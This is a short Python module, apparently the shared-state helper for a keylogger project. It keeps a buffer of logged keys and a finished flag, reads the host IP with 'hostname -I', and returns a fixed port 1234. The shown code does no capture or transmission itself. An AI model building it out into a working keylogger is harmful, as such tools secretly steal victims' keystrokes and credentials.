import os

keylogs = ""
keylogger_finished_flag = False

def add_key(key):
    global keylogs
    keylogs += key

def get_keylogs():
    global keylogs
    return keylogs

def set_keylogger_finished():
    global keylogger_finished_flag
    keylogger_finished_flag = True

def keylogger_finished():
    global keylogger_finished_flag
    return keylogger_finished_flag

def get_ip_address():
    return os.popen('hostname -I').read().strip()

def get_port():
    return 1234
